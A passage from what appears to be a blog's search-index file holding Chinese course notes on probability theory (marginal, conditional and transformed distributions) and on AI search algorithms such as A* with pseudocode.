:= P(X_i\le x) = P(X_i\le x,-\infty<X_j<\infty\,(j\ne i)).</script></li><li><p><strong>连续型</strong></p><p>  $n=2$ 时</p><script type="math/tex; mode=display">  F_X(x)=P(X\le x)=P(X\le x,-\infty<Y<\infty)=\lim_{y\rightarrow\infty}F(x,y).</script><p>  $n=3$ 时</p><script type="math/tex; mode=display">  F_X(x)=P(X\le x,-\infty<Y, Z<\infty)=\lim_{y\rightarrow\infty,z\rightarrow\infty}F(x,y,z).</script><script type="math/tex; mode=display">  F_{X,Y}(x,y)=P(X\le x,Y\le y,-\infty<Z<\infty)=\lim_{z\rightarrow\infty}F(x,y,z).</script></li><li><p><strong>离散型</strong></p><p>$n=2$ 时</p><script type="math/tex; mode=display">F_X(x)=P(X\le x)=\sum\limits_{a\le x}P(X=a)=\sum\limits_{y}\sum\limits_{a\le x}P(X=a,Y=y).</script></li><li><p><strong>例(容斥原理)</strong></p><script type="math/tex; mode=display">  P(X>a,Y>b)=1-F_X(a)-F_Y(b)+F_{X,Y}(a,b).</script></li><li><p><strong>定义(边际 PDF)</strong></p><script type="math/tex; mode=display">  F_X(x) := P(X\le x) = \lim_{y\rightarrow\infty}F(x,y) = \int_{-\infty}^{x}(\int_{-\infty}^{\infty}f(s,t)dt)ds\\</script><p>  $\Rightarrow X$ 的边际 <strong>PDF</strong> 为</p><script type="math/tex; mode=display">  f_X(x)=\int_{-\infty}^{\infty}f(x,y)dy.</script></li><li><p><strong>例</strong>  二元正态分布 $N(\mu_1,\mu_2,\sigma_1^2,\sigma_2^2,\rho)$.</p></li><li><p><strong>解答</strong></p><script type="math/tex; mode=display">\begin{aligned}f_X(x)=\int_{-\infty}^{+\infty}f(x,y)dy=\dfrac{1}{\sqrt{2\pi}\sigma_1}e^{-\frac{(x-\mu_1)^2}{2\sigma_1^2}},\,x\in\mathbb{R}.\end{aligned}</script><p>因此 $X\sim N(\mu_1,\sigma_1^2)$. 同理 $Y\sim N(\mu_2,\sigma_2^2)$.</p></li><li><p><strong>注</strong>  联合分布可确定边际分布, 边际分布不可确定联合分布.</p></li></ul><h2 id="条件分布-以-n-2-为例"><a href="#条件分布-以-n-2-为例" class="headerlink" title="条件分布 (以 $n=2$ 为例)"></a>条件分布 (以 $n=2$ 为例)</h2><ul><li><p><strong>定义(离散型条件分布)</strong>  $P(X=a_i,Y=b_j)=p_{ij}\ge 0$, $\sum\limits_{i,j}p_{ij}\equiv 1$.</p><script type="math/tex; mode=display">P(X=a_i\mid Y=b_j)=\dfrac{P(X=a_i,Y=b_j)}{P(Y=b_j)}=\dfrac{p_{ij}}{\sum\limits_{k}p_{kj}}.</script></li><li><p><strong>注</strong>  $\sum\limits_{i}P(X=a_i\mid Y=b_j)\equiv 1$.</p></li><li><p><strong>定义(连续型条件分布)</strong>  $(X,Y)$ 的 <strong>PDF</strong> 为 $f(x,y)$.</p><script type="math/tex; mode=display">\begin{aligned}P(X\le x\mid y\le Y\le y+dy)&=\dfrac{P(X\le x, y\le Y\le y+dy)}{P(y\le Y\le y+dy)}\\&=\dfrac{\int_{-\infty}^{x}(\int_{y}^{y+dy}f(s,t)dt)ds}{\int_{y}^{y+dy}f_Y(t)dt}.\end{aligned}</script></li><li><p><strong>定义(条件密度函数)</strong></p><script type="math/tex; mode=display">  f_{X\mid Y}(x\mid y\le Y\le y+dy)=\dfrac{\int_{y}^{y+dy}f(x,t)dt}{\int_{y}^{y+dy}f_Y(t)dt}.</script><p>  令 $dy\rightarrow 0$, 定义条件密度函数:</p><script type="math/tex; mode=display">  f_{X\mid Y}(x\mid y)=\dfrac{f(x,y)}{f_Y(y)}.</script><p>   条件密度函数 $f_{X\mid Y}(x\mid y)$ 为 <strong>PDF</strong>.</p></li><li><p><strong>注</strong></p><ul><li>$F(a\mid y)=P(X\le a\mid Y=y)=\int_{-\infty}^{a}f_{X\mid Y}(x\mid y)dx$;</li><li><strong>(乘法法则)</strong>  $f(x,y)=f_{X\mid Y}(x\mid y)f_Y(y)$;</li><li><strong>(全概率公式)</strong>  $f_X(x)=\int_{-\infty}^{\infty}f(x,y)dy=\int_{-\infty}^{\infty}f_{X\mid Y}(x\mid y)f_Y(y)dy$;</li><li><strong>(Bayes 公式)</strong>  $f_{Y\mid X}(y\mid x)=\dfrac{f(x,y)}{f_X(x)}=\dfrac{f_{X\mid Y}(x\mid y)f_Y(y)}{\int_{-\infty}^{\infty}f_{X\mid Y}(x\mid y)f_Y(y)dy}$.</li></ul></li><li><p><strong>例</strong>  二元正态分布.</p></li><li><p><strong>解答</strong>  注意到</p><script type="math/tex; mode=display">\begin{aligned}f_{Y\mid X}(y\mid x)&=\dfrac{f(x,y)}{f_X(x)}\\&=\dfrac{1}{\sqrt{2\pi}\sigma_2}\cdot\dfrac{1}{\sqrt{1-\rho^2}}\cdot\exp\{-\dfrac{[y-(\mu_2+\rho\dfrac{\sigma_2}{\sigma_1}(x-\mu_1))]^2}{2(1-\rho^2)\sigma_2^2}\}.\end{aligned}</script><p>即当 $X=x$ 时, $Y\sim N(\mu_2+\rho\dfrac{\sigma_2}{\sigma_1}(x-\mu_1),(1-\rho^2)\sigma_2^2)$.</p></li></ul><h2 id="独立性"><a href="#独立性" class="headerlink" title="独立性"></a>独立性</h2><ul><li><p><strong>定义(独立性)</strong>  $(X,Y)$ 的 <strong>CDF</strong> 为 $F(x,y)$, 边际 <strong>CDF</strong> $F_X(x)$, $F_Y(y)$. 若</p><script type="math/tex; mode=display">F(x,y)=F_X(x)F_Y(y),\,\forall\,x,y\in\mathbb{R}.</script><p>则称 $X,Y$ 相互独立.</p></li><li><p><strong>注</strong>  $X$, $Y$ 独立 $\Leftrightarrow f(x,y)=f_X(x)f_Y(y),\,\forall\,x,y\in\mathbb{R}$, 其中 $f$ 为 <strong>PDF/PMF</strong>.</p></li><li><p><strong>定义</strong>  $X_1,\cdots,X_n$ 相互独立 $\Leftrightarrow F(x_1,\cdots,x_n)=F_1(x_1)\cdots F_n(x_n),\,\forall\,x_1,\cdots,x_n\in\mathbb{R}.$</p></li><li><p><strong>注</strong>  $X_1,\cdots,X_n$ 独立 $\Leftrightarrow f(x_1,\cdots,x_n)=f_1(x_1)\cdots f_n(x_n),\,\forall\,x_1,\cdots,x_n\in\mathbb{R}$, 其中 $f$ 为 <strong>PDF/PMF</strong>.</p></li><li><p><strong>定理</strong></p><ul><li>$f(x_1,\cdots,x_n)=g_1(x_1)\cdots g_n(x_n),\,\forall\,x_1,\cdots,x_n\in\mathbb{R}$, 则 $X_1,\cdots,X_n$ 独立.</li><li>$X_1,\cdots,X_n$ 独立, $Y_1=g_1(X_1,\cdots,X_n), Y_2=g_2(X_1,\cdots,X_n)$, 则 $Y_1$, $Y_2$ 独立.</li></ul></li></ul><h2 id="随机向量的函数"><a href="#随机向量的函数" class="headerlink" title="随机向量的函数"></a>随机向量的函数</h2><ul><li><p><strong>定义</strong>  $Y=g(X_1,\cdots,X_n)$ </p></li><li><p><strong>例</strong>  $X_i\sim B(n_i, p),i=1,2$ 独立, $Y=X_1+X_2$.</p></li><li><p><strong>解答</strong></p><script type="math/tex; mode=display">\begin{aligned}P(Y=k)&=P(X_1+X_2=k)=\sum_{j=0}^{k}P(X=j,X_2=k-j)\\&=\sum_{j=0}^{k}P(X=j)P(X_2=k-j)\\&=\sum_{j=0}^{k}C_{n_1}^{j}C_{n_2}^{k-j}p^k(1-p)^{n_1+n_2-k}\\&=C_{n_1+n_2}^{k}p^k(1-p)^{n_1+n_2-k}.\end{aligned}</script><p>那么有 $Y\sim B(n_1+n_2,p).$</p></li><li><p><strong>例</strong>  $X_1,X_2$ 连续, $X_1&gt;0$, 其联合 <strong>PDF</strong> 为 $f(x_1,x_2)$, 且 $Y=\dfrac{X_2}{X_1}$.</p></li><li><p><strong>解答</strong>  注意到 $\forall\,y&gt;0$,</p><script type="math/tex; mode=display">\begin{aligned}P(Y\le y)&=P(\dfrac{X_2}{X_1}\le y)\\&=P(X_2\le yX_1)\\&=\int_{D}f(x_1,x_2)dx_1dx_2\\&=\int_{0}^{\infty}(\int_{-\infty}^{yx_1}f(x_1,x_2)dx_2)dx_1\\&=\int_{0}^{\infty}(\int_{-\infty}^{y}f(x_1,x_1t)x_1dt)dx_1.\end{aligned}</script><p>故 $Y$ 的 <strong>PDF</strong> 为</p><script type="math/tex; mode=display">l(y)=\int_{0}^{\infty}x_1f(x_1,x_1y)dx_1.</script></li><li><p><strong>定义(密度函数变换法)</strong>  $X_1,X_2$ 的联合 <strong>PDF</strong> 为 $f(x_1,x_2)$, $g_1,g_2$ 可微可逆, 满足</p><script type="math/tex; mode=display">  \begin{cases}  Y_1=g_1(X_1,X_2)\\  Y_2=g_2(X_1,X_2)  \end{cases}\Rightarrow  \begin{cases}  X_1=h_1(Y_1,Y_2)\\  X_2=h_2(Y_1,Y_2)  \end{cases}</script><p>  那么</p><script type="math/tex; mode=display">  \begin{aligned}  P((Y_1,Y_2)\in A)&=P((X_1,X_2)\in B)\\  &=\int_{B}f(x_1,x_2)dx_1dx_2\\  &=\int_{A}f(h_1(y_1,y_2),h_2(y_1,y_2))\vert J\vert dy_1dy_2.  \end{aligned}</script><p>  其中</p><script type="math/tex; mode=display">  J=det\begin{pmatrix}  \dfrac{\partial h_1}{\partial y_1},\dfrac{\partial h_1}{\partial y_2}\\  \dfrac{\partial h_2}{\partial y_1},\dfrac{\partial h_2}{\partial y_2}  \end{pmatrix}</script><p>  故 $Y_1,Y_2$ 的 <strong>PDF</strong> 为</p><script type="math/tex; mode=display">  l(y_1,y_2)=f(h_1(y_1,y_2),h_2(y_1,y_2))\vert J\vert.</script></li><li><p><strong>例</strong>  $X_1,X_2$ 连续, $X_1&gt;0$, 其联合 <strong>PDF</strong> 为 $f(x_1,x_2)$, 且 $Y=X_1+X_2$.</p></li><li><p><strong>解答</strong></p><p>令 $Z=X_1$, 则 $X_1=Z, X_2=Y-Z$. 故 $Y,Z$ 的 <strong>PDF</strong> 为</p><script type="math/tex; mode=display">l(y,z)=f(z,y-z)\vert J\vert=f(z,y-z).</script><p>其中</p><script type="math/tex; mode=display">J=det\begin{pmatrix}0,&1\\1,&-1\end{pmatrix}</script><p>那么 $Y$ 的 <strong>PDF</strong> 为</p><script type="math/tex; mode=display">l_Y(y)=\int_{-\infty}^{\infty}f(z,y-z)dz</script></li><li><p><strong>注</strong></p><ul><li><p>若 $X_1,X_2$ 独立, 则</p><script type="math/tex; mode=display">l_Y(y)=\int_{-\infty}^{\infty}f_1(z)f_2(y-z)dz=f_1*f_2(y).</script></li><li><p>若 $(X_1,X_2)\sim N(\mu_1,\mu_2,\sigma_1^2,\sigma_2^2,\rho)$, 则 </p><script type="math/tex; mode=display">Y=X_1+X_2\sim N(\mu_1+\mu_2,\sigma_1^2+\sigma_2^2+2\rho\sigma_1\sigma_2).</script></li></ul></li><li><p><strong>注</strong>  三大分布: <strong>Chi-Square</strong> 分布 $\chi^2(n)$, $t_n$, $F$.</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
          <category> Probability Theory </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Probability Theory </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>人工智能导论 笔记1</title>
      <link href="/2023/03/15/ren-gong-zhi-neng-dao-lun-bi-ji-1/"/>
      <url>/2023/03/15/ren-gong-zhi-neng-dao-lun-bi-ji-1/</url>
      
        <content type="html"><![CDATA[<h1 id="第一章-搜索问题"><a href="#第一章-搜索问题" class="headerlink" title="第一章 搜索问题"></a>第一章 搜索问题</h1><h2 id="深度优先搜索"><a href="#深度优先搜索" class="headerlink" title="深度优先搜索"></a>深度优先搜索</h2><ul><li><p>优先扩展深度深的节点.</p></li><li><p><strong>例</strong>  皇后问题 (<strong>深度优先+回溯</strong>).</p>  <div align="center"><img src="/pic/49.png" width="100%" height="100%"></div></li><li><p>性质:</p><ul><li>一般<strong>不能保证</strong>找到最优解.</li><li>当深度限制不合理时, 可能找不到解, 可以将算法改为<strong>可变深度</strong>限制.</li><li>最坏情况时, 搜索空间等同于<strong>穷举</strong>.</li><li>是一个通用的<strong>与问题无关</strong>的方法.</li><li><strong>节省内存</strong>, 只存储从初始节点到当前节点的路径.</li></ul></li></ul><h2 id="宽度优先搜索"><a href="#宽度优先搜索" class="headerlink" title="宽度优先搜索"></a>宽度优先搜索</h2><ul><li><p>优先扩展深度浅的节点.</p>  <div align="center"><img src="/pic/50.png" width="100%" height="100%"></div></li><li><p>性质:</p><ul><li>当问题有解时, <strong>一定</strong>能找到解.</li><li>当问题为<strong>单位耗散值</strong>, 且问题<strong>有解</strong>时, 一定能找到<strong>最优解</strong>.</li><li>方法与问题无关, 具有<strong>通用性</strong>.</li><li><strong>效率</strong>较低, <strong>存储量</strong>比较大 (带<strong>深度模拟</strong>的<strong>深度优先搜索</strong>).</li></ul></li></ul><h2 id="Dijkstra-算法"><a href="#Dijkstra-算法" class="headerlink" title="Dijkstra 算法"></a>Dijkstra 算法</h2><ul><li><p>宽度优先没有考虑两个节点间的距离.</p>  <div align="center"><img src="/pic/51.png" width="100%" height="100%"></div></li><li><p>优先扩展距离起点最近的节点, 直到终点距离最短.</p>  <div align="center"><img src="/pic/52.png" width="100%" height="100%"></div></li><li><p>优点: 当问题<strong>有解</strong>时, 可以找到<strong>最佳解</strong>.</p></li><li>不足: 只考虑了<strong>节点距离起点</strong>的距离, 没有考虑<strong>节点到终点</strong>的距离.</li></ul><h2 id="启发式图搜索"><a href="#启发式图搜索" class="headerlink" title="启发式图搜索"></a>启发式图搜索</h2><ul><li><p>引入<strong>启发知识</strong>, 保证找到<strong>最佳解</strong>时, 尽可能<strong>减少搜索范围</strong>, 提高<strong>搜索效率</strong>.</p></li><li><p>启发知识: <strong>评估节点到达目标的距离</strong>.</p></li><li><p><strong>启发式搜索算法 A</strong>:</p><ul><li><p>$g^*(n)$: 从 $s$ 到 $n$ 的最短路径的耗散值.</p></li><li><p>$h^*(n)$: 从 $n$ 到 $g$ 的最短路径的耗散值.</p></li><li><p>$f^*(n)=g^*(n)+h^*(n)$: 从 $s$ 经过 $n$ 到 $g$ 的最短路径的耗散值.</p></li><li><p>$g(n)$, $h(n)$, $f(n)$ 分别是 $g^*(n)$, $h^*(n)$, $f^*(n)$ 的<strong>估计值</strong>.</p></li><li><p>用 $f(n)$ 对待扩展节点<strong>进行评价</strong>, 优先扩展 $f(n)$ 值最小的节点, 直到 $f(终点)$ 最小.</p>  <div align="center"><img src="/pic/53.png" width="100%" height="100%"></div></li><li><p>$m_j$: 扩展时<strong>第一次生成</strong>, 父节点标记为 $n$.</p></li><li><p>$m_k$: 已生成<strong>尚未扩展</strong>, 比较 $f(m_k)$, $f(n,m_k)$ 决定是否重标记父节点.</p></li><li><p>$m_l$: 已生成<strong>已扩展</strong>, 比较 $f(m_l)$, $f(n,m_l)$ 决定是否重标记父节点, 并重新扩展.</p>  <div align="center"><img src="/pic/54.png" width="100%" height="100%"></div>  <pre class="line-numbers language-pseudocode" data-language="pseudocode"><code class="language-pseudocode"># A-algorithm(s): s 为初始节点OPEN=(s), CLOSED=(), f(s)=g(s)+h(s);while OPEN 不空 do:    begin        n=FIRST(OPEN);        if GOAL(n) THEN return n;        REMOVE(n, OPEN), ADD(n, CLOSED);        EXPAND(n)→{m_i},      计算 f(n, m_i)=g(n, m_i)+h(m_i);  ADD(m_j, OPEN), 标记 m_j 到 n 的指针;      if f(n, m_k)&lt;f(m_k) then             f(m_k)=f(n, m_k), 标记 m_k 到 n 的指针;      if f(n, m_l)&lt;f(m_l) then             f(m_l)=f(n, m_l), 标记 m_l 到 n 的指针,       ADD(m_l, OPEN);    OPEN 中的节点按 f 值从小到大排序;   end whilereturn FAIL;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>从目标开始, 顺序访问<strong>父节点</strong>, 直到初始节点, 得到<strong>解路径</strong>.</p></li><li><p><strong>例(八数码问题)</strong>  定义 $g(n)$ 为到当前节点的耗散值, $h(n)$ 为当前节点<strong>不在位</strong>的将牌数.</p>  <div align="center"><img src="/pic/55.png" width="100%" height="100%"></div></li></ul></li><li><p><strong>最佳图搜索算法 A*</strong>:</p><ul><li><p>在 <strong>A</strong> 算法中, 如果满足条件:</p><script type="math/tex; mode=display">  h(n)\le h^*(n)</script><p>  则 <strong>A</strong> 算法称为 <strong>A*</strong> 算法.</p></li><li><p><strong>例(八数码问题)</strong>  定义 $h_1(n)$ 为当前节点<strong>不在位</strong>的将牌数, $h_2(n)$ 为当前节点将牌<strong>不在位的距离和</strong>, 注意到这两种定义均满足 <strong>A*</strong> 算法的条件.</p></li><li><p>选取 $h$ 的<strong>一般原则</strong>: 放宽限制条件, 在<strong>宽条件</strong>下给出<strong>估计函数</strong>.</p></li><li><p><strong>定理 1</strong>  若存在从初始节点 $s$ 到目标节点 $t$ 有路径, 则 <strong>A*</strong> 必能找到最佳解结束.</p></li><li><p><strong>定理 2</strong>  对同一问题定义两个 <strong>A*</strong> 算法 <strong>A</strong>$_1$ 和 <strong>A</strong>$_2$, 若 <strong>A</strong>$_2$ 比 <strong>A</strong>$_1$ 有较多的启发信息, 即对所有非目标节点有 $h_2(n)&gt;h_1(n)$, 则在具有一条从 $s$ 到 $t$ 的路径的隐含图上, 搜索结束时由 <strong>A</strong>$_2$ 所扩展的每一个节点, 也必定由 <strong>A</strong>$_1$ 所扩展, 即 <strong>A</strong>$_1$ 扩展的节点数 $\ge$ <strong>A</strong>$_2$ 扩展的节点数 (估计更准确).</p><ul><li>上述评价指标是 “<strong>扩展的节点数</strong>”, 同一个节点只计算一次.</li><li>为什么条件不能是 $h_2(n)\ge h_1(n)$? 什么情况下会出现问题? 能否给定理再增加条件, 使得定理在 $h_2(n)\ge h_1(n)$ 条件下也成立?</li><li><strong>提示</strong>: 考虑那些 $f(n)=f^*(t)$ 的节点, $t$ 为目标节点. 如果不考虑这样的节点, 等号可以加上.</li></ul></li><li><p>对 $h$ 的<strong>评价方法</strong>: 设共<strong>扩展</strong>了 $d$ <strong>层</strong>节点, 共<strong>搜索</strong>了 $N$ <strong>个</strong>节点, 计算得<strong>平均分叉数</strong> $b^*$.</p><script type="math/tex; mode=display">  N=\dfrac{1-b^{*(d+1)}}{1-b^*}.</script><p>  $b^*$ <strong>越小</strong>, 说明 $h$ <strong>效果越好</strong>. $b^*$ 是较<strong>稳定</strong>的常数, 基本<strong>不随问题规模变化</strong>.</p></li></ul></li><li><p><strong>A* 算法的改进</strong>:</p><ul><li><p>因 <strong>A</strong> 算法对 $m_l$ 类节点可能要<strong>重新放回</strong>到 <strong>OPEN</strong> 表中, 因此可能会导致多次<strong>重复扩展</strong>同一个节点, 导致<strong>搜索效率下降</strong>.</p></li><li><p>扩展未找到<strong>初始节点</strong>到<strong>当前节点</strong>的<strong>最短路径</strong>; 距离<strong>越近</strong>, 估计应<strong>越准</strong>.</p>  <div align="center"><img src="/pic/56.png" width="100%" height="100%"></div></li><li><p><strong>对 $h$ 加以限制</strong>: 第一次扩展节点时, 就找到了从 $s$ 到该节点的最短路径.</p>  <div align="center"><img src="/pic/57.png" width="100%" height="100%"></div><p>  此时称 $h$ 是单调的.</p><ul><li><p><strong>定理</strong>  若 $h(n)$ 是单调的, 则 <strong>A*</strong> 扩展了节点 $n$ 之后, 就已经找到了到达节点 $n$ 的最佳路径. 即当 <strong>A*</strong> 选 $n$ 扩展时, 有 $g(n)=g^*(n)$.</p></li><li><p><strong>定理</strong>  当 $h(n)$ 满足单调条件时, 一定满足 <strong>A*</strong> 条件.</p></li></ul></li><li><p><strong>对算法加以改进</strong>: 避免或减少节点的多次扩展.</p><ul><li><strong>定理</strong>  <strong>OPEN</strong> 表上任以具有 $f(n)&lt;f^*(s)$ 的节点定会被 <strong>A*</strong> 扩展.</li><li><strong>定理</strong>  <strong>A*</strong> 选作扩展的任一节点, 定有 $f(n)\le f^*(s)$.</li><li><p><strong>定理</strong>  当 $h(n)$ 恒等于 0 时, $h$ 为单调的.</p><pre class="line-numbers language-pseudocode" data-language="pseudocode"><code class="language-pseudocode"># Modified-A-algorithm(s): s 为初始节点OPEN=(s), CLOSED=(), f(s)=g(s)+h(s), f_m=0;while OPEN 不空 do：    begin        NEST={n_i|f(n_i)&lt;f_m,ni-&gt;OPEN}      if NEST≠( ) then n=NEST 中 g 最小的节点        else n=FIRST(OPEN), f_m=f(n);        if GOAL(n) THEN return n;        REMOVE(n, OPEN), ADD(n, CLOSED);        EXPAND(n →{mi},      计算 f(n, m_i)=g(n, m_i)+h(m_i);  ADD(m_j, OPEN), 标记 m_j 到 n 的指针;      if f(n, m_k)&lt;f(m_k) then             f(m_k)=f(n, m_k), 标记 m_k 到 n 的指针;      if f(n, m_l)&lt;f(m_l) then             f(m_l)=f(n, m_l), 标记 m_l 到 n 的指针,       ADD(m_l, OPEN);    OPEN 中的节点按 f 值从小到大排序;   end whilereturn FAIL;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><div align="center"><img src="/pic/58.png" width="100%" height="100%"></div></li></ul></li></ul></li></ul><h2 id="其他的搜索算法"><a href="#其他的搜索算法" class="headerlink" title="其他的搜索算法"></a>其他的搜索算法</h2><ul><li><p><strong>局部搜索</strong>算法: <strong>爬山法</strong>.</p></li><li><p><strong>随机搜索</strong>算法.</p></li><li><p><strong>动态规划</strong>算法 (当 $\forall\,n$, 有 $h(n)=0$, <strong>A*</strong> 算法即为动态规划): <strong>viterbi</strong> 算法.</p>  <div align="center"><img src="/pic/59.png" width="100%" height="100%"></div><script type="math/tex; mode=display">  Q(W_{i,j})=\begin{cases}  \min\limits_k(Q(W_{i-1,k})+D(W_{i-1,k},W_{i,j})),&i\ne 0\\  0,&i=0.  \end{cases}</script></li></ul><h2 id="搜索算法实用举例"><a href="#搜索算法实用举例" class="headerlink" title="搜索算法实用举例"></a>搜索算法实用举例</h2><ul><li><p><strong>拼音输入法</strong>:</p><script type="math/tex; mode=display">  P(S)=\prod_{i=1}^{n}P(w_i\mid w_1\cdots w_{i-1}).</script><p>  二元语法时:</p><script type="math/tex; mode=display">  P(S)=\prod_{i=1}^{n}P(w_i\mid w_{i-1}).</script><p>  需要求</p><script type="math/tex; mode=display">  \min\Big(-\sum_{i=1}^{n}\log\big(P(w_i\mid w_{i-1})\big)\Big)</script><p>  对应的句子.</p>  <div align="center"><img src="/pic/60.png" width="100%" height="100%"></div></li></ul>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> IAI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IAI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>概率论与数理统计 笔记2</title>
      <link href="/2023/03/08/gai-lu-lun-yu-shu-li-tong-ji-bi-ji-2/"/>
      <url>/2023/03/08/gai-lu-lun-yu-shu-li-tong-ji-bi-ji-2/</url>
      
        <content type="html"><![CDATA[<h1 id="Chap-2-随机变量"><a href="#Chap-2-随机变量" class="headerlink" title="Chap 2 随机变量"></a>Chap 2 随机变量</h1><h2 id="1-维随机变量"><a href="#1-维随机变量" class="headerlink" title="1 维随机变量"></a>1 维随机变量</h2><ul><li><p><strong>定义(随机变量)</strong>  样本空间上的实值函数.</p><script type="math/tex; mode=display">X: \Omega\rightarrow\mathbb{R},\,\omega\rightarrow X(\omega).</script></li><li><p><strong>例</strong></p></li></ul><div class="table-container"><table><thead><tr><th style="text-align:center">试验</th><th style="text-align:center">样本空间</th><th style="text-align:center">随机变量</th><th style="text-align:center">像集 (新样本空间)</th></tr></thead><tbody><tr><td style="text-align:center">随机调查 $50$ 人对某议题支持与否</td><td style="text-align:center">$\{(1, 0, \cdots), \cdots\}$</td><td style="text-align:center">$X_1= 1$ 的个数</td><td style="text-align:center">$\{0, 1, 2, \cdots, 50\}$</td></tr><tr><td style="text-align:center">随机抽取一个北京市成年公民</td><td style="text-align:center">所有北京市成年公民之集</td><td style="text-align:center">$X_2=$ 其 $2022$ 年的收入</td><td style="text-align:center">$(-\infty, +\infty)$</td></tr></tbody></table></div><ul><li><p><strong>定义(事件)</strong>  $X_1 = 30$, $X_2&gt;100,000$.</p></li><li><p><strong>注</strong></p><ul><li>概括作用: 提供了试验结果的数值摘要;</li><li>事件 <strong>v.s.</strong> 变量, 静态 <strong>v.s.</strong> 动态.</li></ul></li><li><p><strong>分类</strong></p><ul><li>离散型: 至多可数个取值;</li><li>连续型: 区间型取值 (定义不严格);</li><li>其他.</li></ul></li><li><p><strong>定义</strong>  $\forall I\subset\mathbb{R}$, 令 $X^{-1}(I)$ 表示 $I$ 在 $X$ 下的原像集, $X^{-1}(I)\subset\Omega$, 例如</p><script type="math/tex; mode=display">X^{-1}((a, b)) = \{\omega\in\Omega\mid a<X(\omega)<b\}.</script></li><li><p><strong>定义</strong> </p><script type="math/tex; mode=display">  P_{X}(X\in I) = P(X^{-1}(I)), \,\forall I\subset\mathbb{R}\,可测.</script><p>  需要 $X^{-1}(I)\in\mathscr{F}$, 一般记 $P_X$ 为 $P$.</p></li><li><p><strong>定义(累积分布函数)(CDF)</strong> </p><script type="math/tex; mode=display">  F(x) := P(X\le x), \,\forall x\in\mathbb{R}.</script><p>  我们有</p><script type="math/tex; mode=display">  P(a<X\le b)=F(b)-F(a).</script></li><li><p><strong>性质</strong></p><ul><li>$0\le F(x)\le 1$, 单调增(未必严格);</li><li>$\lim\limits_{x\rightarrow+\infty}F(x) = 1$, $\lim\limits_{x\rightarrow-\infty}F(x) = 0$;</li><li>右连续 ($PS.$ 若定义 $F(x) := P(X&lt;x)$, $\forall x\in\mathbb{R}$, 则有 $F(x)$ 左连续).</li></ul></li><li><p><strong>注</strong></p><ul><li><p>随机要素体现在样本点 $\omega$ 的不确定性;</p></li><li><p>随机变量的直观意义往往出现在样本空间的直观意义之前;</p></li></ul></li></ul><ul><li><p><strong>辨析</strong> </p><script type="math/tex; mode=display">  X_i=  \begin{cases}  1,\,第i次抛硬币正面向上; \\  0,\,第i次抛硬币正面向下. \\  \end{cases}</script><p>  其中 $i=1, 2$. 那么 $X_1 + X_2$ 的样本空间为</p><script type="math/tex; mode=display">  \{正正, 正反, 反正, 反反\}.</script><p>  因为随机变量可视作函数, 需要满足定义域相同, 因此 $X_1$, $X_2$ 的定义域同上.</p></li><li><p><strong>注</strong></p><ul><li>$aX+bY$, $XY$, $\dfrac{X}{Y}(Y\ne 0)$, $g(X,Y)$ 为随机变量, 其中 $X$, $Y$ 样本空间相同;</li><li>需要有 $X^{-1}(I)\in\mathscr{F}$, 从而 $P(X^{-1}(I))$ 有意义.</li></ul></li><li><p><strong>定义(同分布)</strong>  $X_1, X_2$ 的 <strong>CDF</strong> 分别为 $F_1(x), F_2(x)$, 那么</p><script type="math/tex; mode=display">  X_1, X_2 同分布\Leftrightarrow P(X_1^{-1}(I)) = P(X_2^{-1}(I)),\forall\,I\subset\mathbb{R}\,可测\\  \Leftrightarrow F_1(x) = F_2(x),\,\forall\,x\in\mathbb{R}.</script></li><li><p><strong>注</strong></p><ul><li>$X_1, X_2$ 同分布 $\nRightarrow X_1 = X_2$.</li><li>考虑掷一次硬币,  $X_1=$ 正面向上的次数, $X_2=$ 反面向上的次数, 这两个随机变量是同分布的.</li><li>随机变量是函数!</li></ul></li></ul><h2 id="离散型随机变量"><a href="#离散型随机变量" class="headerlink" title="离散型随机变量"></a>离散型随机变量</h2><ul><li><p><strong>定义(概率质量函数)(PMF)</strong> </p><script type="math/tex; mode=display">f(x) = P(X = x),\,\forall\,x\in\,\mathbb{R}.</script></li><li><p><strong>注</strong></p><ul><li>$f(x_i)=p_i, \sum\limits_{i}P_i = 1$;</li><li><strong>CDF</strong> 为阶梯函数.</li></ul></li><li><p><strong>定义(期望与方差)</strong> </p><script type="math/tex; mode=display">  E(X) = \sum\limits_{i}x_ip_i = \sum\limits_{i}x_if(x_i) = \mu\\  Var(X) = \sum\limits_{i}(x_i-\mu)^2p_i = \sum\limits_{i}(x_i-\mu)^2f(x_i) = \sigma^2</script><p>  我们有</p><script type="math/tex; mode=display">  Var(X) = E((X-E(X))^2) = E(X^2) - E^2(X).</script></li><li><p><strong>注</strong></p><ul><li>算数均值即期望:</li></ul><script type="math/tex; mode=display">\dfrac{1}{n}\sum_{i = 1}^na_i=\dfrac{1}{n}\sum_{i = 1}^nk_ix_i=\sum_{i = 1}^np_ix_i=\mu;</script><ul><li>期望存在 $\Leftrightarrow$ $\sum\limits_{i}\vert x_i\vert p_i&lt;+\infty$;</li><li>$E(g(X)) = \sum\limits_{i}g(x_i)p_i$;</li><li>$E(X), Var(X)$ 为随机变量 $X$ 的分布的特征, 分别刻画了随机变量的集中趋势和分散程度.</li></ul></li></ul><h2 id="常见离散分布"><a href="#常见离散分布" class="headerlink" title="常见离散分布"></a>常见离散分布</h2><ul><li><p><strong>定义(Bernoulli 分布)</strong></p><script type="math/tex; mode=display">X=\begin{cases}1,\,事件成功,\,p \\0,\,事件不成功,\,1-p \\\end{cases}</script><p>记为 $X\sim B(p)$. 我们有</p><script type="math/tex; mode=display">E(X)=p, Var(X)=p(1-p).</script></li><li><p><strong>定义(二项分布)</strong></p><p>  记 $X$ 为 $n$ 次独立 <strong>Bernoulli</strong> 试验的成功次数. 满足</p><script type="math/tex; mode=display">  P(X=k)=C_n^kp^k(1-p)^{n-k},\,k=0,1,\cdots,n.</script><p>  记为 $X\sim B(n,p)$. 我们有</p><script type="math/tex; mode=display">  E(X)=np, 